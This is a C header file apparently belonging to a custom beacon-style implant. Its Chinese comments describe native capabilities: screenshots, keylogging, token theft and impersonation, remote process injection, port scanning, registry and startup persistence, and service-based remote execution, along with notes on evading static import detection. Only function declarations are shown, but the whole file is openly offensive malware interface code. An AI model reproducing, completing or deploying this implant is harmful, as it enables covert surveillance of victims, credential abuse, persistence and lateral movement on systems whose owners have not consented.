/*
 * csdev :: beacon2_ops.h  --  植入体原生能力接口
 * ==========================================================================
 * 实现见 beacon2_ops.c。所有外部 DLL 调用均运行期解析, 不进入静态导入表。
 * ==========================================================================
 */
#ifndef CSDEV_BEACON2_OPS_H
#define CSDEV_BEACON2_OPS_H

/* 截屏: 输出 24 位 BMP 字节流, 返回长度 (0 = 失败) */
unsigned int ops_screenshot(unsigned char *out, unsigned int cap);

/* 键盘记录: start != 0 启动; == 0 停止并把捕获内容写入 out, 返回长度 */
unsigned int ops_keylog(int start, unsigned char *out, unsigned int cap);

/* 取走键盘缓冲 (不清空): 返回长度, *buf 指向内部缓冲 */
unsigned int ops_keylog_peek(unsigned char **buf);

/* 取走并清空键盘缓冲; out == NULL 表示仅丢弃 */
unsigned int ops_keylog_drain(unsigned char *out, unsigned int cap);

/* 键盘记录线程是否在运行 (sleep mask 需要据此跳过掩码, 否则会崩) */
int ops_keylog_active(void);

/* Token: sub = "getuid" | "steal <pid>" | "rev2self" | "getprivs"
 *            | "make <domain> <user> <password>"
 *
 * make uses LOGON32_LOGON_NEW_CREDENTIALS + LOGON32_PROVIDER_DEFAULT, then
 * DuplicateToken + ImpersonateLoggedOnUser. Same semantics as
 * "runas /netonly": the local identity does not change and the password is
 * NOT validated locally -- only outbound network authentication (SMB / WMI /
 * WinRM) uses the supplied credentials. LogonUserA is imported from advapi32,
 * which is one of the four DLLs the beacon may link against statically. */
unsigned int ops_token(const char *sub, const char *arg, unsigned char *out, unsigned int cap);

/* 注入: 把 payload 写入 pid 并创建远程线程 */
unsigned int ops_inject(unsigned int pid, const unsigned char *payload, unsigned int plen,
                        unsigned char *out, unsigned int cap);

/* 端口扫描: host + "22,80,443" 或 "1-1024" */
unsigned int ops_portscan(const char *host, const char *ports, int timeout_ms,
                          unsigned char *out, unsigned int cap);

/* 持久化 (不走 shell):
 *   mode 1 = HKCU Run   2 = HKLM Run   3 = 启动目录(复制自身)
 *        7 = 列出       8 = 清理
 *   name 为注册表值名 / 落地文件名, 空则用默认值 */
unsigned int ops_persist(int mode, const char *name, unsigned char *out, unsigned int cap);

/* 原生 psexec: 走 SCM API 在远程主机建服务并启动, 不调用 sc.exe */
unsigned int ops_psexec(const char *host, const char *cmd, unsigned char *out, unsigned int cap);

#endif /* CSDEV_BEACON2_OPS_H */
